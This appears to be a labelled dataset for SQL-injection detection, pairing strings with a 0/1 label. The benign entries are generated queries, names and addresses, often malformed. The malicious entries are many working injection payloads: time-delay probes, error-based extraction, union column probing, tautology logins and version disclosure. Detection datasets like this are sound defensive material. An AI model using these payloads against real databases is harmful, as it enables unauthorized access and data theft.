"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """;1
1'  )   where 3861  =  3861;1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """;1
SELECT AVG ( gradually ) FROM such SELECT SUM ( meat ) ;0
SELECT love ( s FROM however RIGHT JOIN;0
-6419 union all select 7008,7008,7008,7008,7008--;1
-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--;1
or 1  =  1 /*;1
SELECT dirt ( s )  FROM safe;0
1 union all select null,null#;1
SELECT * FROM my WHERE NOT of = 'minerals'  AND NOT people = 'reader';0
SELECT * FROM language WHERE yourself = 'goose'  OR smoke = 'being';0
edilio;0
SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL;0
"1""  )   as dlfq where 8410  =  8410";1
SELECT workerID AS ID, mostly AS spin FROM room;0
"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --";1
SELECT shot ( s )  FROM height SELECT noun FROM zero;0
33560;0
SELECT TOP 50 PERCENT * FROM instant SELECT * FROM managed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM nine;0
SELECT COUNT ( favorite ) , automobile FROM blow BY bring;0
ORDER BY 7#;1
SELECT COUNT ( roar ) , first FROM scientific BY to;0
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--;1
insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ;1
SELECT AVG ( greatest ) FROM doctor SELECT SUM ( route ) ;0
"UPDATE inventory SET price = 'active' WHERE quantity = 123;";0
INSERT INTO double ( visitor, sure, donkey, nuts, soldier, press )  VALUES  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )  ;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--;1
"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld";1
1   )    )    as dqfl where 7527  =  7527;1
SELECT * FROM grain  WHERE tongue NOT LIKE '[automobile]%';0
SELECT Count ( * )  AS leave;0
"1""  )   where 8878  =  8878 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --";1
" end and    (    (     (  ""revx""  =  ""revx";1
SELECT COUNT ( about ) , sunlight FROM anywhere BY together;0
SELECT * FROM writing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM according;0
1'||  (  select 'etvo' from dual where 1557  =  1557;1
-3555'  )   or make_set  (  9354  =  9354,7185  )   and   (  'papr'  =  'papr;1
"-7258""  )   as wjjr where 2110  =  2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--";1
SELECT * FROM tail WHERE herd = 'sun'  AND  ( film = 'entirely' OR become = 'sport' ) ;0
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #";1
"INSERT INTO logs (email, name, user_id) VALUES ('Sample text', 'john@example.com', 'pending');";0
declare @s varchar   (  8000  )   select @s   =   0x73656c ...;1
"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap";1
SELECT * FROM soil WHERE part BETWEEN 'fight' AND 'said';0
"UPDATE sessions SET created_at = 'john@example.com' WHERE price = 123;";0
1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #;1
SELECT TOP 3 * FROM ill WHERE store = 'sister' SELECT * FROM feet;0
1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib;1
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
FROM  ( SELECT DISTINCT volume FROM try ) ;0
1 where 4844  =  4844;1
or 1 in   (  select @@version  )  --;1
SELECT * FROM year WHERE NOT tightly = 'examine'  AND NOT chose = 'poor';0
1' where 4945  =  4945;1
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +';1
"1""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --";1
1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  ';1
"DELETE FROM inventory WHERE user_id = 'Sample text';";0
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1";1
"DELETE FROM inventory WHERE price = 'john@example.com';";0
"-2321%""  )   or 2271  =  7683--";1
select * from users where id  =  1 *1 or 1  =  1 -- 1;1
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature;0
1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr;1
1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--;1
SELECT TOP 3 * FROM hardly WHERE interior = 'cannot';0
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ) ;0
SELECT TOP 50 PERCENT * FROM map SELECT * FROM shown FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown;0
1  )   as xuvz where 3061  =  3061 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
UPDATE thread SET tool = 'surprise'WHERE fighting = 'clothes';0
SELECT * FROM supply ORDER BY pocket;0
SELECT thank, settle, gift FROM community WHERE stranger  IS NULL;0
SELECT MIN ( large )  AS hardly FROM century;0
SELECT * FROM lunch FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM baseball;0
"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
SELECT * FROM chamber  WHERE think NOT LIKE '[add]%';0
SELECT COUNT ( DISTINCT complete )  FROM fact;0
"1%""   )    )     )  ";1
"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte";1
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1";1
select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --;1
1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --;1
SELECT TOP 3 * FROM piano WHERE wear = 'environment';0
and 1  =  0  )   union all;1
SELECT population ( s ) FROM star INNER JOIN;0
anatoly;0
SELECT * FROM amount WHERE part BETWEEN 'grandmother' AND 'card';0
"INSERT INTO employees (email, description) VALUES ('user123', 'pending');";0
select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
SELECT modern AS forty, belong AS [done]  FROM dozen;0
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --";1
"-4639""   )    )     )   or 8550  =  9348";1
1 exec sp_   (  or exec xp_  ) ;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--;1
SELECT COUNT ( noseID ) FROM fastened;0
OR 1=0--;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--;1
echecopar torrella;0
SELECT stomach ( s )  FROM attached SELECT supply ( s ) ;0
SELECT TOP 3 * FROM round;0
"DELETE FROM customers WHERE price = 456;";0
SELECT shot ( s )  FROM height SELECT noun FROM zero;0
1  )   as tkkn where 7832  =  7832   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --;1
"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #";1
admin' or 1=1;1
select sleep  (  5  )   and   (  'vwmx'  =  'vwmx;1
)   or benchmark  (  10000000,MD5  (  1   )    )   #;1
SELECT * FROM child WHERE    NOT blow = 'flight';0
"1""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
lesaca clar;0
68252027x;0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb";1
pl. poeta badenes, 48, 11-c;0
SELECT column_name ( s )  FROM individual,moon;0
"SELECT name, description FROM logs WHERE user_id = 'active';";0
UEf;1
waggenheim@rubirubi.info;0
-9700'  )   or 8811  =  7862;1
union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--;1
SELECT * FROM promised ORDER BY there, bet;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#;1
-6015%'  )   order by 1--;1
1   )    )     )   and 6467  =  1864#;1
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ) ;0
1   )    )     )   union all select null,null,null,null,null,null,null#;1
1  )   as dqda where 1624  =  1624 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||';1
SELECT AVG ( circus ) FROM instead SELECT SUM ( secret ) ;0
select   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  select 5009 from information_schema.character_sets  )   end  )  #;1
SELECT * FROM population ORDER BY page DESC;0
)    )    or pg_sleep  (  __TIME__  )  --;1
-4325' or make_set  (  9354  =  9354,7185  )  ;1
75590487k;0
SELECT * FROM plane;0
3,82E+15;0
1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509;1
1'+  (  select iutk where 6158  =  6158;1
"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""rfam"" like ""rfam";1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
SELECT * FROM move WHERE religious = 'lost' FETCH FIRST 3 ROWS ONLY;0
" end and ""mdje"" like ""mdje";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#;1
1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
SELECT MIN ( real )  AS means FROM struggle;0
-3496'   )    )    or 9323  =  9323#;1
UNION SELECT;1
SELECT * FROM border WHERE gift IN  ( SELECT giving FROM own ) ;0
mccauley@autobuses-hibridos.ph;0
1' ORDER BY 1,2,3--+;1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--;1
SELECT * FROM simple WHERE too IN  ( 'since', 'still', 'stone' )  ;0
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1";1
select * from users where id  =  '1' or .<   =  1 union select 1,@@VERSION -- 1';1
SELECT * FROM likely WHERE equally = 'is';0
"SLEEP(5)=""";1
1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --;1
SELECT include, eaten, solidFROM die WHERE partly  IS NOT NULL;0
SELECT * FROM  ( SELECT bill FROM widely ) ;0
-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--;1
1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #;1
"1""  )   union all select null,null,null,null,null--";1
1'  )   where 5616  =  5616;1
SELECT * FROM worth ORDER BY oxygen, follow;0
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT * FROM structure WHERE brought BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT * FROM notice 3 SELECT * FROM wish;0
ORDER BY 28;1
SELECT * FROM clothes WHERE NOT dear = 'deal'  AND NOT adventure = 'table';0
"UPDATE employees SET price = 'user123' WHERE id = 'pending';";0
1'   )    )    as vwua where 8099  =  8099 union all select null--;1
SELECT individual, decide, milkFROM deeply WHERE citizen  IS NOT NULL;0
"DELETE FROM logs WHERE id = '2023-01-01';";0
"UPDATE sessions SET price = '2023-01-01' WHERE quantity = 'Sample text';";0
"DELETE FROM employees WHERE id = 'user123';";0
34310;0
SELECT COUNT ( height ) FROM studying;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#;1
SELECT blind AS equator, answer AS [driving]  FROM charge;0
1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --;1
SELECT theory,minerals,attempt FROM leg LEFT JOIN Orders ON write.itselfID =  country.stone ORDER BY together.seeing;0
"DELETE FROM sessions WHERE name = '2023-01-01';";0
SELECT * FROM job FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT * FROM silent WHERE society = 'failed' FETCH FIRST 3 ROWS ONLY;0
molledo basagaa;0
-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--;1
segu san marful;0
regueras de arriba;0
47;0
ruben;0
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#;1
8520;0
"SELECT price FROM employees WHERE created_at = 'user123';";0
SELECT * FROM difference 3 SELECT * FROM snow;0
"1%""   )    )    union all select null,null,null,null--";1
"-1134"" union all select 4865,4865,4865,4865,4865#";1
SELECT continent ( s )  FROM him SELECT grain ( s ) ;0
praxila;0
calle sergio luna, s/n 11g;0
SELECT COUNT ( stage ) , yourself FROM hardly BY fierce;0
SELECT die, hard+ ', ' + ask+ ' ' + suggest+ ', ' + drop AS threw  FROM ability;0
SELECT * FROM satellites WHERE studied = 'but'  OR syllable = 'film';0
SELECT MIN ( box )  AS film FROM tie;0
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist;0
barceo;0
SELECT north ( s )  FROM team UNION;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19;1
62258107m;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#;1
SELECT * FROM primitive WHERE broad = 'for'  OR pet = 'additional';0
SELECT COUNT ( guess ) , shall FROM measure BY tobacco;0
ORDER BY 9#;1
SELECT breadID AS ID, ahead AS feed FROM unhappy;0
"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --";1
SELECT child FROM hurt;0
1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
SELECT COUNT ( soldier )  FROM farmer;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16;1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
end and    (    (   '%'  =  ';1
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely";1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- jdia;1
1' or '1'  =  '1;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8;1
SELECT * FROM language WHERE yourself = 'goose'  OR smoke = 'being';0
-6400   )    )    union all select 4650,4650,4650--;1
SELECT * FROM also WHERE Price NOT BETWEEN 10 AND 20;0
SELECT * FROM arrive WHERE NOT suppose = 'yourself'  AND NOT fine = 'up';0
"-7884"" where 3297  =  3297 or 2492  =  6158";1
1'  )   as fksm where 9714  =  9714;1
60613075w;0
SELECT * FROM birthday WHERE continued = 'slowly' FETCH FIRST 3 ROWS ONLY;0
select * from users where id  =  1.<@. union select 1,version  (    )   -- 1;1
rudolf;0
91704360w;0
"INSERT INTO sessions (created_at, email, name, user_id) VALUES ('pending', 123, 'active', 'user123');";0
-3752%' union all select 9351--;1
"INSERT INTO customers (description, user_id) VALUES ('active', 'john@example.com');";0
1  )   where 2940  =  2940;1
tridente;0
SELECT AVG ( hurry ) FROM name SELECT SUM ( phrase ) ;0
"1""   )    )    as rpxd where 4929  =  4929";1
1  )   where 1402  =  1402;1
-1188   )    )    union all select 4711--;1
"DELETE FROM inventory WHERE email = 'pending';";0
-5379'  )   union all select 4294,4294,4294--;1
"1""   )    )    and 2006  =  2006";1
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason;0
1'  )   as jiic where 6158  =  6158 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --;1
